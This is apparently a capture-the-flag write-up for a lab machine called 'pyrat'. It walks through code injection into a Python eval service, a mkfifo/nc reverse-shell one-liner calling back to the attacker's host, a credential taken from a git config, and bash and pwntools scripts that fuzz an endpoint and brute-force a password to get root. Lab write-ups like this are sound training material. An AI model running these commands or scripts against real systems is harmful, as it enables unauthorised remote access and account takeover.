# pyrat

open ports: 22, 8000

making a normal http request to port 8000, we get a response of "use a simpler connection!", which seems to be the extent of the server's http capabilities

one thing to note is the server header `SimpleHTTP/0.6 Python/3.11.2`

taking their advice we can connect to the port with nc, and just spamming random stuff into the connection we get error messges from python such as `name 'asdf' is not defined` which implies that our input is literally just getting eval()'d or something

after testing random shit like print(1) which works we can just go straight for the os commands

```
print(os.getuid())
33

print(os.system('which nc'))
0

print(os.system('which bash'))
0
```

use our trusty mkfifo revshell and voila:

`os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 192.168.207.250 1337 >/tmp/f')`

```
listening on [any] 1337 ...
connect to [192.168.207.250] from (UNKNOWN) [10.66.175.252] 34700
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

the hint in the box description aludes to a credential in some "well known" folder

i grepped and find'd around other directories like etc, postfix, but didn't find anything

then i just started looking manually in any other dirs, like /srv /mnt /opt where user data may be, and lo and behold there is a git repo in /opt/dev, the password extracted from the .git/config is for the user 'think', who we can now just ssh into the box as and get the user flag

looking more into the git repo we find an edit for an older version of pyrat.py, the application we need to exploit:


```
# git log

commit 0a3c36d66369fd4b07ddca72e5379461a63470bf (HEAD -> master)
Author: Jose Mario <josemlwdf@github.com>
Date:   Wed Jun 21 09:32:14 2023 +0000

    Added shell endpoint
```

```
# git restore .
# cat pyrat.py.old

...............................................

def switch_case(client_socket, data):
    if data == 'some_endpoint':
        get_this_enpoint(client_socket)
    else:
        # Check socket is admin and downgrade if is not aprooved
        uid = os.getuid()
        if (uid == 0):
            change_uid()

        if data == 'shell':
            shell(client_socket)
        else:
            exec_python(client_socket, data)

def shell(client_socket):
    try:
        import pty
        os.dup2(client_socket.fileno(), 0)
        os.dup2(client_socket.fileno(), 1)
        os.dup2(client_socket.fileno(), 2)
        pty.spawn("/bin/sh")
    except Exception as e:
        send_data(client_socket, e

...............................................
```

but what we really want to find out is the current value instead of 'some_endpoint'

i just used this _dirty_ script to try to find any endpoints (using socat to make closing the connection easier)

```
#!/bin/bash

while read -r line; do
	s="$(echo "$line" | socat - TCP:10.66.175.252:8000|tee -a log.txt)"
	[[ "$s" =~ "not defined" ]] || echo "interesting response for word $line: $s"
done < words.list
```

[fuxx.sh](fuxx.sh)

the endpoint is `admin`!

```
$ nc 10.66.175.252 8000
admin
Password:
asdf
Password:
gggasd
Password:
gfgdf


admin
Start a fresh client to begin.
```

here is my script to fuzz the passwords, it just uses pwntools lol

[fuxx.py](fuxx.py)

```python
from pwn import *

host = "10.66.175.252"
port = 8000

#context.log_level = "debug"

passwords = open("words.list").read().splitlines()

for batch in [passwords[i:i+3] for i in range(0, len(passwords), 3)]:
    r = remote(host, port)

    r.sendline(b"admin")

    for pwd in [p.encode() for p in batch]:
        
        if r.recvuntil(b"Password:", timeout=2):
            print("Trying", pwd)
            r.sendline(pwd)
            continue
        data = r.recvall(timeout=1)
        print("success", data)
        exit()

    r.close()
```

the password we find from this will just drop us into a root shell via pyrat


